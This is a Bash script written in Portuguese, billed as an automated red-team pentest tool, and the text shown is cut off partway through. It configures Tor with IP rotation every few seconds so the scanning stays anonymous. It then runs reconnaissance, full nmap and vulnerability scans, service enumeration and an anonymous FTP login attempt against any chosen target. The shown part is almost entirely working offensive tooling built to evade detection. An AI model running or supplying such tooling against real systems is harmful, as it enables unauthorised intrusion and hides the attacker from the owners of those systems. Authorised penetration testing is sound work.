#!/bin/bash

################################################################################
#                                                                              #
#  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—               #
#  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•               #
#  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘                  #
#  â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â•  â•šâ•â•â•â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘                  #
#  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘                  #
#  â•šâ•â•     â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•   â•šâ•â•   â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•   â•šâ•â•                  #
#                                                                              #
#  PENTEST AUTOMATIZADO COMPLETO - Red Team Edition                           #
#  VersÃ£o: 3.0                                                                 #
#  Data: 28 de Novembro de 2025                                                #
#  Autor: Red Team Setup                                                       #
#                                                                              #
#  âš ï¸  AVISO LEGAL: USE APENAS COM AUTORIZAÃ‡ÃƒO FORMAL POR ESCRITO!            #
#                                                                              #
################################################################################

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# ConfiguraÃ§Ãµes globais
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
TARGET=""
OUTPUT_DIR=""
FINAL_REPORT=""
WORDLIST_DIR="/usr/share/wordlists"
SECLISTS="/usr/share/seclists"
TOOLS_DIR="${SCRIPT_DIR}/Kali/Ferramentas"

# OPSEC
OPSEC_LIB="${SCRIPT_DIR}/lib/opsec.sh"
TOR_CHANGER="${TOOLS_DIR}/Auto_Tor_IP_changer/autoTOR.py"
USE_TOR_ROTATION=false
TOR_PID=""
PROXYCHAINS_CONF="/etc/proxychains4.conf"

# Contadores de vulnerabilidades
VULN_CRITICAL=0
VULN_HIGH=0
VULN_MEDIUM=0
VULN_LOW=0
VULN_INFO=0

# Arrays para armazenar descobertas
declare -a OPEN_PORTS
declare -a SERVICES
declare -a VULNERABILITIES
declare -a EXPLOITED

################################################################################
# FUNÃ‡Ã•ES UTILITÃRIAS
################################################################################

print_banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    cat << "EOF"
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                                            â•‘
â•‘               PENTEST AUTOMATIZADO COMPLETO v3.0                           â•‘
â•‘                     Red Team Security Testing                              â•‘
â•‘                                                                            â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
EOF
    echo -e "${NC}"
}

log() {
    local level=$1
    shift
    local message="$@"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case $level in
        "INFO")
            echo -e "${BLUE}[â„¹]${NC} ${message}"
            echo "[${timestamp}] [INFO] ${message}" >> "${OUTPUT_DIR}/pentest.log"
            ;;
        "SUCCESS")
            echo -e "${GREEN}[âœ“]${NC} ${message}"
            echo "[${timestamp}] [SUCCESS] ${message}" >> "${OUTPUT_DIR}/pentest.log"
            ;;
        "WARNING")
            echo -e "${YELLOW}[âš ]${NC} ${message}"
            echo "[${timestamp}] [WARNING] ${message}" >> "${OUTPUT_DIR}/pentest.log"
            ;;
        "ERROR")
            echo -e "${RED}[âœ—]${NC} ${message}"
            echo "[${timestamp}] [ERROR] ${message}" >> "${OUTPUT_DIR}/pentest.log"
            ;;
        "VULN")
            echo -e "${RED}${BOLD}[ğŸ”¥]${NC} ${message}"
            echo "[${timestamp}] [VULN] ${message}" >> "${OUTPUT_DIR}/pentest.log"
            ;;
    esac
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        log "ERROR" "Este script precisa ser executado como root!"
        log "INFO" "Execute: sudo $0"
        exit 1
    fi
}

load_opsec() {
    log "INFO" "Carregando biblioteca OPSEC..."
    
    if [[ -f "$OPSEC_LIB" ]]; then
        source "$OPSEC_LIB"
        log "SUCCESS" "Biblioteca OPSEC carregada!"
        return 0
    else
        log "WARNING" "Biblioteca OPSEC nÃ£o encontrada em: $OPSEC_LIB"
        log "WARNING" "Continuando sem proteÃ§Ãµes OPSEC avanÃ§adas..."
        return 1
    fi
}

setup_tor_rotation() {
    log "INFO" "Configurando rotaÃ§Ã£o automÃ¡tica de IP via Tor..."
    
    # Verificar se autoTOR.py existe
    if [[ ! -f "$TOR_CHANGER" ]]; then
        log "ERROR" "Auto_Tor_IP_changer nÃ£o encontrado em: $TOR_CHANGER"
        return 1
    fi
    
    # Verificar se Tor estÃ¡ instalado
    if ! command -v tor &> /dev/null; then
        log "INFO" "Instalando Tor..."
        apt update > /dev/null 2>&1
        apt install tor -y > /dev/null 2>&1
    fi
    
    # Verificar se proxychains estÃ¡ instalado
    if ! command -v proxychains4 &> /dev/null && ! command -v proxychains &> /dev/null; then
        log "INFO" "Instalando Proxychains..."
        apt install proxychains4 -y > /dev/null 2>&1
    fi
    
    # Configurar proxychains
    log "INFO" "Configurando Proxychains para Tor..."
    if [[ -f "$PROXYCHAINS_CONF" ]]; then
        # Backup da configuraÃ§Ã£o original
        cp "$PROXYCHAINS_CONF" "${PROXYCHAINS_CONF}.backup" 2>/dev/null
        
        # Configurar para usar Tor
        cat > "$PROXYCHAINS_CONF" << 'EOF'
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 9050
EOF
        log "SUCCESS" "Proxychains configurado!"
    fi
    
    # Iniciar serviÃ§o Tor
    log "INFO" "Iniciando serviÃ§o Tor..."
    systemctl start tor 2>/dev/null || service tor start 2>/dev/null
    sleep 3
    
    # Verificar se Tor estÃ¡ rodando
    if ! pgrep -x tor > /dev/null; then
        log "ERROR" "Falha ao iniciar Tor!"
        return 1
    fi
    
    # Testar conectividade Tor
    log "INFO" "Testando conectividade Tor..."
    local tor_ip=$(proxychains4 -q curl -s --max-time 10 https://api.ipify.org 2>/dev/null)
    
    if [[ -n "$tor_ip" ]]; then
        log "SUCCESS" "Tor funcionando! IP atual: $tor_ip"
    else
        log "WARNING" "NÃ£o foi possÃ­vel verificar IP via Tor"
    fi
    
    # Iniciar rotaÃ§Ã£o automÃ¡tica de IP em background
    log "INFO" "Iniciando rotaÃ§Ã£o automÃ¡tica de IP (mudanÃ§a a cada 3 segundos)..."
    
    # Criar script Python para rotaÃ§Ã£o automÃ¡tica
    cat > "${OUTPUT_DIR}/tor_rotator.py" << 'TORPY'
#!/usr/bin/env python3
import time
import os
import signal
import sys

def signal_handler(sig, frame):
    print('\n[!] RotaÃ§Ã£o de IP Tor interrompida')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

print('[*] Iniciando rotaÃ§Ã£o de IP Tor a cada 3 segundos...')
print('[*] Pressione Ctrl+C para parar')

while True:
    try:
        time.sleep(3)
        os.system("service tor reload > /dev/null 2>&1")
        print('[+] IP rotacionado em', time.strftime('%H:%M:%S'))
    except Exception as e:
        print(f'[!] Erro: {e}')
        break
TORPY
    
    chmod +x "${OUTPUT_DIR}/tor_rotator.py"
    
    # Executar rotaÃ§Ã£o em background
    python3 "${OUTPUT_DIR}/tor_rotator.py" >> "${OUTPUT_DIR}/tor_rotation.log" 2>&1 &
    TOR_PID=$!
    
    log "SUCCESS" "RotaÃ§Ã£o de IP iniciada! (PID: $TOR_PID)"
    log "INFO" "IP serÃ¡ alterado a cada 3 segundos automaticamente"
    
    USE_TOR_ROTATION=true
    return 0
}

stop_tor_rotation() {
    if [[ -n "$TOR_PID" ]] && ps -p $TOR_PID > /dev/null 2>&1; then
        log "INFO" "Parando rotaÃ§Ã£o de IP Tor..."
        kill $TOR_PID 2>/dev/null
        wait $TOR_PID 2>/dev/null
        log "SUCCESS" "RotaÃ§Ã£o de IP parada"
    fi
    
    # Restaurar proxychains original
    if [[ -f "${PROXYCHAINS_CONF}.backup" ]]; then
        mv "${PROXYCHAINS_CONF}.backup" "$PROXYCHAINS_CONF" 2>/dev/null
    fi
}

get_current_ip() {
    local ip=""
    
    if [[ "$USE_TOR_ROTATION" == true ]]; then
        # Obter IP atravÃ©s do Tor
        ip=$(proxychains4 -q curl -s --max-time 5 https://api.ipify.org 2>/dev/null)
    else
        # Obter IP direto
        ip=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null)
    fi
    
    echo "${ip:-unknown}"
}

run_with_opsec() {
    local cmd="$@"
    
    if [[ "$USE_TOR_ROTATION" == true ]]; then
        # Executar atravÃ©s do Tor com proxychains
        proxychains4 -q $cmd 2>&1
    else
        # Executar diretamente
        $cmd 2>&1
    fi
}

check_dependencies() {
    log "INFO" "Verificando dependÃªncias..."
    
    local deps=(
        "nmap"
        "nikto"
        "gobuster"
        "dirb"
        "wpscan"
        "sqlmap"
        "hydra"
        "enum4linux"
        "smbclient"
        "snmp-check"
        "theHarvester"
        "dnsrecon"
        "dnsenum"
        "whatweb"
        "wafw00f"
        "curl"
        "wget"
        "nc"
        "whois"
        "dig"
        "host"
    )
    
    local missing=0
    for cmd in "${deps[@]}"; do
        if ! command -v "$cmd" &> /dev/null; then
            log "WARNING" "DependÃªncia nÃ£o encontrada: $cmd"
            missing=$((missing + 1))
        fi
    done
    
    if [[ $missing -gt 0 ]]; then
        log "WARNING" "$missing dependÃªncias nÃ£o encontradas. Continuando mesmo assim..."
    else
        log "SUCCESS" "Todas as dependÃªncias estÃ£o instaladas!"
    fi
}

check_wordlists() {
    log "INFO" "Verificando wordlists..."
    
    if [[ ! -f "/usr/share/wordlists/rockyou.txt" ]]; then
        log "WARNING" "rockyou.txt nÃ£o encontrado. Tentando descompactar..."
        if [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
            gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
            log "SUCCESS" "rockyou.txt descompactado!"
        fi
    fi
    
    if [[ ! -d "$SECLISTS" ]]; then
        log "WARNING" "SecLists nÃ£o encontrado em $SECLISTS"
        log "INFO" "Instale com: sudo apt install seclists -y"
    else
        log "SUCCESS" "SecLists encontrado!"
    fi
}

setup_environment() {
    log "INFO" "Configurando ambiente..."
    
    # Criar estrutura de diretÃ³rios
    OUTPUT_DIR="${SCRIPT_DIR}/pentest_results/${TARGET}_${TIMESTAMP}"
    mkdir -p "${OUTPUT_DIR}"/{recon,scanning,exploitation,web,passwords,loot,screenshots}
    
    FINAL_REPORT="${OUTPUT_DIR}/RELATORIO_FINAL.txt"
    
    log "SUCCESS" "DiretÃ³rio criado: ${OUTPUT_DIR}"
    
    # Iniciar log
    echo "========================================" > "${OUTPUT_DIR}/pentest.log"
    echo "PENTEST AUTOMATIZADO - Iniciado em $(date)" >> "${OUTPUT_DIR}/pentest.log"
    echo "Target: ${TARGET}" >> "${OUTPUT_DIR}/pentest.log"
    echo "OPSEC Mode: ${USE_TOR_ROTATION}" >> "${OUTPUT_DIR}/pentest.log"
    echo "========================================" >> "${OUTPUT_DIR}/pentest.log"
}

opsec_pre_check() {
    echo ""
    log "INFO" "${BOLD}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    log "INFO" "CHECKLIST OPSEC PRÃ‰-PENTEST"
    log "INFO" "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    
    # Executar checklist OPSEC da biblioteca
    if [[ -f "$OPSEC_LIB" ]]; then
        source "$OPSEC_LIB"
        
        if ! pre_engagement_check; then
            log "WARNING" "Alguns checks OPSEC falharam!"
            read -p "Deseja continuar mesmo assim? (s/N): " continue_anyway
            if [[ ! "$continue_anyway" =~ ^[Ss]$ ]]; then
                log "INFO" "Pentest cancelado pelo usuÃ¡rio"
                exit 0
            fi
        fi
    else
        log "WARNING" "Biblioteca OPSEC nÃ£o disponÃ­vel, pulando checklist avanÃ§ado..."
        
        # Checks bÃ¡sicos
        log "INFO" "Verificando IP atual..."
        local current_ip=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null)
        if [[ -n "$current_ip" ]]; then
            log "INFO" "IP atual: $current_ip"
        else
            log "ERROR" "NÃ£o foi possÃ­vel obter IP!"
            exit 1
        fi
    fi
}

validate_target() {
    log "INFO" "Validando target: ${TARGET}"
    
    # Verificar se Ã© IP ou domÃ­nio
    if [[ $TARGET =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        log "SUCCESS" "Target identificado como IP: ${TARGET}"
    elif [[ $TARGET =~ ^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$ ]]; then
        log "SUCCESS" "Target identificado como domÃ­nio: ${TARGET}"
    else
        log "ERROR" "Target invÃ¡lido: ${TARGET}"
        exit 1
    fi
    
    # Verificar conectividade
    if ping -c 1 -W 2 "$TARGET" &> /dev/null; then
        log "SUCCESS" "Target estÃ¡ online e acessÃ­vel!"
    else
        log "WARNING" "Target nÃ£o responde a ping (pode ter firewall/IDS)"
    fi
}

################################################################################
# FASE 1: RECONHECIMENTO (OSINT)
################################################################################

phase_reconnaissance() {
    echo ""
    log "INFO" "${BOLD}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    log "INFO" "FASE 1: RECONHECIMENTO (OSINT)"
    log "INFO" "IP Atual: $(get_current_ip)"
    log "INFO" "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    
    # WHOIS
    log "INFO" "Executando WHOIS lookup..."
    run_with_opsec whois "$TARGET" > "${OUTPUT_DIR}/recon/whois.txt" 2>&1
    if [[ -s "${OUTPUT_DIR}/recon/whois.txt" ]]; then
        log "SUCCESS" "WHOIS concluÃ­do: $(wc -l < ${OUTPUT_DIR}/recon/whois.txt) linhas"
    fi
    
    # DNS Enumeration
    log "INFO" "EnumeraÃ§Ã£o DNS com multiple tools..."
    
    # DNSRecon
    if command -v dnsrecon &> /dev/null; then
        log "INFO" "Executando DNSRecon (via Tor: $USE_TOR_ROTATION)..."
        run_with_opsec dnsrecon -d "$TARGET" -t std > "${OUTPUT_DIR}/recon/dnsrecon.txt" 2>&1
        log "SUCCESS" "DNSRecon concluÃ­do"
    fi
    
    # DNSenum
    if command -v dnsenum &> /dev/null; then
        log "INFO" "Executando DNSenum (via Tor: $USE_TOR_ROTATION)..."
        run_with_opsec dnsenum "$TARGET" > "${OUTPUT_DIR}/recon/dnsenum.txt" 2>&1
        log "SUCCESS" "DNSenum concluÃ­do"
    fi
    
    # Dig
    log "INFO" "Executando queries DNS (dig)..."
    dig "$TARGET" ANY > "${OUTPUT_DIR}/recon/dig_any.txt" 2>&1
    dig "$TARGET" A > "${OUTPUT_DIR}/recon/dig_a.txt" 2>&1
    dig "$TARGET" MX > "${OUTPUT_DIR}/recon/dig_mx.txt" 2>&1
    dig "$TARGET" NS > "${OUTPUT_DIR}/recon/dig_ns.txt" 2>&1
    dig "$TARGET" TXT > "${OUTPUT_DIR}/recon/dig_txt.txt" 2>&1
    log "SUCCESS" "DNS queries concluÃ­das"
    
    # TheHarvester
    if command -v theHarvester &> /dev/null; then
        log "INFO" "Executando TheHarvester (email/subdomain gathering)..."
        theHarvester -d "$TARGET" -b all -f "${OUTPUT_DIR}/recon/harvester" > /dev/null 2>&1 &
        HARVESTER_PID=$!
        log "INFO" "TheHarvester executando em background (PID: $HARVESTER_PID)"
    fi
    
    # Subdomain enumeration com wordlist
    if [[ -f "${SECLISTS}/Discovery/DNS/subdomains-top1million-5000.txt" ]]; then
        log "INFO" "EnumeraÃ§Ã£o de subdomÃ­nios com wordlist..."
        gobuster dns -d "$TARGET" -w "${SECLISTS}/Discovery/DNS/subdomains-top1million-5000.txt" -o "${OUTPUT_DIR}/recon/subdomains.txt" --quiet 2>/dev/null &
        GOBUSTER_DNS_PID=$!
        log "INFO" "Gobuster DNS executando em background (PID: $GOBUSTER_DNS_PID)"
    fi
    
    log "SUCCESS" "Fase de Reconhecimento iniciada (algumas tarefas em background)"
}

################################################################################
# FASE 2: SCANNING E ENUMERAÃ‡ÃƒO
################################################################################

phase_scanning() {
    echo ""
    log "INFO" "${BOLD}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    log "INFO" "FASE 2: SCANNING E ENUMERAÃ‡ÃƒO DE PORTAS"
    log "INFO" "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    
    # Quick scan inicial (top 1000 portas)
    log "INFO" "Iniciando quick scan (top 1000 portas)..."
    log "INFO" "IP da varredura: $(get_current_ip)"
    
    if [[ "$USE_TOR_ROTATION" == true ]]; then
        proxychains4 -q nmap -sT -Pn -T4 -F "$TARGET" -oN "${OUTPUT_DIR}/scanning/quick_scan.txt" -oX "${OUTPUT_DIR}/scanning/quick_scan.xml" > /dev/null 2>&1
    else
        nmap -T4 -F "$TARGET" -oN "${OUTPUT_DIR}/scanning/quick_scan.txt" -oX "${OUTPUT_DIR}/scanning/quick_scan.xml" > /dev/null 2>&1
    fi
    log "SUCCESS" "Quick scan concluÃ­do"
    
    # Identificar portas abertas
    OPEN_PORTS=($(grep "^[0-9]*/tcp.*open" "${OUTPUT_DIR}/scanning/quick_scan.txt" | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//'))
    
    if [[ ${#OPEN_PORTS[@]} -eq 0 ]]; then
        log "WARNING" "Nenhuma porta aberta encontrada no quick scan. Executando full scan..."
        
        # Full TCP scan
        log "INFO" "Full TCP port scan (1-65535)..."
        if [[ "$USE_TOR_ROTATION" == true ]]; then
            proxychains4 -q nmap -sT -Pn -p- -T4 "$TARGET" -oN "${OUTPUT_DIR}/scanning/full_tcp.txt" -oX "${OUTPUT_DIR}/scanning/full_tcp.xml" > /dev/null 2>&1
        else
            nmap -p- -T4 "$TARGET" -oN "${OUTPUT_DIR}/scanning/full_tcp.txt" -oX "${OUTPUT_DIR}/scanning/full_tcp.xml" > /dev/null 2>&1
        fi
        
        OPEN_PORTS=($(grep "^[0-9]*/tcp.*open" "${OUTPUT_DIR}/scanning/full_tcp.txt" | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//'))
    fi
    
    if [[ ${#OPEN_PORTS[@]} -gt 0 ]]; then
        log "SUCCESS" "Portas abertas encontradas: ${OPEN_PORTS[*]}"
        
        # Service version detection nas portas abertas
        log "INFO" "Detectando versÃµes de serviÃ§os..."
        if [[ "$USE_TOR_ROTATION" == true ]]; then
            proxychains4 -q nmap -sT -Pn -sV -sC -p "${OPEN_PORTS[*]}" "$TARGET" -oN "${OUTPUT_DIR}/scanning/service_detection.txt" -oX "${OUTPUT_DIR}/scanning/service_detection.xml" > /dev/null 2>&1
        else
            nmap -sV -sC -p "${OPEN_PORTS[*]}" "$TARGET" -oN "${OUTPUT_DIR}/scanning/service_detection.txt" -oX "${OUTPUT_DIR}/scanning/service_detection.xml" > /dev/null 2>&1
        fi
        log "SUCCESS" "DetecÃ§Ã£o de serviÃ§os concluÃ­da"
        
        # OS Detection
        log "INFO" "Tentando detectar sistema operacional..."
        if [[ "$USE_TOR_ROTATION" == true ]]; then
            proxychains4 -q nmap -sT -Pn -O "$TARGET" -oN "${OUTPUT_DIR}/scanning/os_detection.txt" > /dev/null 2>&1
        else
            nmap -O "$TARGET" -oN "${OUTPUT_DIR}/scanning/os_detection.txt" > /dev/null 2>&1
        fi
        log "SUCCESS" "OS detection concluÃ­do"
        
        # Vulnerability scan
        log "INFO" "Executando vulnerability scan (NSE scripts)..."
        if [[ "$USE_TOR_ROTATION" == true ]]; then
            proxychains4 -q nmap -sT -Pn --script vuln -p "${OPEN_PORTS[*]}" "$TARGET" -oN "${OUTPUT_DIR}/scanning/vuln_scan.txt" > /dev/null 2>&1
        else
            nmap --script vuln -p "${OPEN_PORTS[*]}" "$TARGET" -oN "${OUTPUT_DIR}/scanning/vuln_scan.txt" > /dev/null 2>&1
        fi
        log "SUCCESS" "Vulnerability scan concluÃ­do"
        
        # Scripts NSE adicionais
        log "INFO" "Executando scripts NSE especÃ­ficos..."
        if [[ "$USE_TOR_ROTATION" == true ]]; then
            proxychains4 -q nmap -sT -Pn --script=default,discovery,safe -p "${OPEN_PORTS[*]}" "$TARGET" -oN "${OUTPUT_DIR}/scanning/nse_scripts.txt" > /dev/null 2>&1
        else
            nmap --script=default,discovery,safe -p "${OPEN_PORTS[*]}" "$TARGET" -oN "${OUTPUT_DIR}/scanning/nse_scripts.txt" > /dev/null 2>&1
        fi
        log "SUCCESS" "NSE scripts concluÃ­dos"
        
    else
        log "ERROR" "Nenhuma porta TCP aberta encontrada!"
    fi
    
    # UDP scan (top 100 portas mais comuns)
    log "INFO" "UDP scan (top 100 portas)..."
    if [[ "$USE_TOR_ROTATION" == true ]]; then
        log "WARNING" "UDP scan via Tor nÃ£o Ã© eficiente, pulando..."
    else
        nmap -sU --top-ports 100 -T4 "$TARGET" -oN "${OUTPUT_DIR}/scanning/udp_scan.txt" > /dev/null 2>&1
        log "SUCCESS" "UDP scan concluÃ­do"
    fi
    
    # Extrair serviÃ§os para enumeraÃ§Ã£o especÃ­fica
    grep "open" "${OUTPUT_DIR}/scanning/service_detection.txt" | awk '{print $3}' | sort -u > "${OUTPUT_DIR}/scanning/services_list.txt"
    
    # Parse de vulnerabilidades encontradas
    parse_vulnerabilities "${OUTPUT_DIR}/scanning/vuln_scan.txt"
}

parse_vulnerabilities() {
    local vuln_file=$1
    
    if [[ -f "$vuln_file" ]]; then
        local vulns=$(grep -i "VULNERABLE" "$vuln_file" | wc -l)
        if [[ $vulns -gt 0 ]]; then
            log "VULN" "Encontradas $vulns possÃ­veis vulnerabilidades no scan Nmap!"
            VULN_HIGH=$((VULN_HIGH + vulns))
        fi
    fi
}

################################################################################
# FASE 3: ENUMERAÃ‡ÃƒO DE SERVIÃ‡OS ESPECÃFICOS
################################################################################

phase_service_enumeration() {
    echo ""
    log "INFO" "${BOLD}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    log "INFO" "FASE 3: ENUMERAÃ‡ÃƒO DE SERVIÃ‡OS ESPECÃFICOS"
    log "INFO" "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    
    # Verificar cada porta aberta e executar enumeraÃ§Ã£o especÃ­fica
    while IFS= read -r line; do
        if [[ $line =~ ^([0-9]+)/tcp.*open.*([a-zA-Z0-9-]+) ]]; then
            local port="${BASH_REMATCH[1]}"
            local service="${BASH_REMATCH[2]}"
            
            log "INFO" "Enumerando porta $port ($service)..."
            
            case $port in
                21)
                    enumerate_ftp "$port"
                    ;;
                22)
                    enumerate_ssh "$port"
                    ;;
                23)
                    enumerate_telnet "$port"
                    ;;
                25|587)
                    enumerate_smtp "$port"
                    ;;
                53)
                    enumerate_dns "$port"
                    ;;
                80|8080|8000|8888)
                    enumerate_http "$port" "http"
                    ;;
                443|8443)
                    enumerate_http "$port" "https"
                    ;;
                139|445)
                    enumerate_smb "$port"
                    ;;
                161)
                    enumerate_snmp "$port"
                    ;;
                389|636)
                    enumerate_ldap "$port"
                    ;;
                3306)
                    enumerate_mysql "$port"
                    ;;
                3389)
                    enumerate_rdp "$port"
                    ;;
                5432)
                    enumerate_postgresql "$port"
                    ;;
                *)
                    log "INFO" "Porta $port: EnumeraÃ§Ã£o genÃ©rica"
                    enumerate_generic "$port"
                    ;;
            esac
        fi
    done < "${OUTPUT_DIR}/scanning/service_detection.txt"
}

enumerate_ftp() {
    local port=$1
    log "INFO" "Enumerando FTP (porta $port)..."
    log "INFO" "IP atual: $(get_current_ip)"
    
    # NSE scripts para FTP
    if [[ "$USE_TOR_ROTATION" == true ]]; then
        proxychains4 -q nmap -sT -Pn --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p "$port" "$TARGET" -oN "${OUTPUT_DIR}/scanning/ftp_enum.txt" > /dev/null 2>&1
    else
        nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p "$port" "$TARGET" -oN "${OUTPUT_DIR}/scanning/ftp_enum.txt" > /dev/null 2>&1
    fi
    
    # Verificar anonymous login
    if grep -q "Anonymous FTP login allowed" "${OUTPUT_DIR}/scanning/ftp_enum.txt"; then
        log "VULN" "FTP permite login anÃ´nimo!"
        VULN_HIGH=$((VULN_HIGH + 1))
        VULNERABILITIES+=("FTP Anonymous Login Enabled (Port $port)")
        
        # Tentar listar arquivos
        log "INFO" "Tentando listar arquivos via FTP anÃ´nimo..."
        echo -e "anonymous\nanonymous\nls\nquit" | ftp -n "$TARGET" "$port" > "${OUTPUT_DIR}/exploitation/ftp_anonymous_files.txt" 2>&1
    fi
    
    log "SUCCESS" "EnumeraÃ§Ã£o FTP concluÃ­da"
}

enumerate_ssh() {
    local port=$1
    log "INFO" "Enumerando SSH (porta $port)..."
    
    # NSE scripts para SSH
    nmap --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos -p "$port" "$TARGET" -oN "${OUTPUT_DIR}/scanning/ssh_enum.txt" > /dev/null 2>&1
    
    # Extrair banner
    nc -vn -w 2 "$TARGET" "$port" < /dev/null > "${OUTPUT_DIR}/scanning/ssh_banner.txt" 2>&1
    
    log "SUCCESS" "EnumeraÃ§Ã£o SSH concluÃ­da"
}

enumerate_telnet() {
    local port=$1
    log "INFO" "Enumerando Telnet (porta $port)..."
    
    log "VULN" "Telnet detectado! Protocolo inseguro (cleartext)"
    VULN_MEDIUM=$((VULN_MEDIUM + 1))
    VULNERABILITIES+=("Telnet Service Running (Insecure - Port $port)")
    
    # Extrair banner
    timeout 5 nc -vn "$TARGET" "$port" < /dev/null > "${OUTPUT_DIR}/scanning/telnet_banner.txt" 2>&1
    
    log "SUCCESS" "EnumeraÃ§Ã£o Telnet concluÃ­da"
